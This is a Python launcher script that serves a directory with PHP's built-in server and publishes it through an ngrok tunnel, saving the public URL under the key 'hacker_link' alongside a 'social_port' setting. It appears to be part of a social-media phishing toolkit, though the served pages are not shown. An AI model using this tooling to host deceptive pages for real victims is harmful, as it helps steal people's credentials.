import os
import subprocess
import sys
from pyngrok import ngrok
from colorama import Fore
import json
import requests
import bs4
import re
import time
import platform


temp = (str(sys.argv[1]))

os_name = platform.uname()[0]

with open('getdata/config.json',"r") as myport:
    port = json.load(myport)['social_port']
    myport.close()






def phpserv():
    with open("getdata/log.log","w") as phplog:
        subprocess.Popen(('php', '-S', 'localhost:'+port,'-t',temp), stdout=phplog, stderr=phplog) 
        getpid()
        ngrok_run()
        time.sleep(5)
        get_ngrok_url()
        getpidpy()
        get_ngrok_pid()


def ngrok_run():
    with open("getdata/ngrok.log","w") as phplog:
        subprocess.Popen(('pyngrok', 'http', port), stdout=phplog, stderr=phplog) 



def getpid():
    if os_name == "Windows":

        pid = [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if "php.exe" in item.split()]
        
        with open("getdata/config.json","r") as json_file:

            json_decoded = json.load(json_file)
            json_decoded['php_pid'] = pid[1]

        with open("getdata/config.json", 'w') as json_file:
            json.dump(json_decoded, json_file)
            json_file.close()
    
    
    elif os_name == "Linux":
        pid = subprocess.getoutput("pgrep php").split()

        with open("getdata/config.json","r") as json_file:

            json_decoded = json.load(json_file)
            json_decoded['php_pid'] = pid[1]

        with open("getdata/config.json", 'w') as json_file:
            json.dump(json_decoded, json_file)
            json_file.close()
        
            



def getpidpy():
    py_pid = os.getpid()


    with open("getdata/config.json") as json_file:
        json_decoded = json.load(json_file)
        json_decoded['py_pid'] = str(py_pid)

    with open("getdata/config.json", 'w') as json_file:
        json.dump(json_decoded, json_file)





def get_ngrok_url():
    url = "http://localhost:4040/api/tunnels/"
    res = requests.get(url).json()
    a = (res['tunnels'][0]['public_url'])
    with open("getdata/config.json") as json_file:
        json_decoded = json.load(json_file)
        json_decoded['hacker_link'] = str(a)

    with open("getdata/config.json", 'w') as json_file:
        json.dump(json_decoded, json_file)


def get_ngrok_pid():
    if os_name == "Windows":
        
        pid = [item.split()[1] for item in os.popen('tasklist').read().splitlines()[4:] if "ngrok.exe" in item.split()]
        # print(pid)
        with open("getdata/config.json","r") as json_file:

            json_decoded = json.load(json_file)
            json_decoded['ngrok_pid'] = pid[0]

        with open("getdata/config.json", 'w') as json_file:
            json.dump(json_decoded, json_file)
            json_file.close()
    
    elif os_name == "Linux":
        pid = subprocess.getoutput("pgrep ngrok").split()

        with open("getdata/config.json","r") as json_file:

            json_decoded = json.load(json_file)
            json_decoded['ngrok_pid'] = pid[0]

        with open("getdata/config.json", 'w') as json_file:
            json.dump(json_decoded, json_file)
            json_file.close()

phpserv()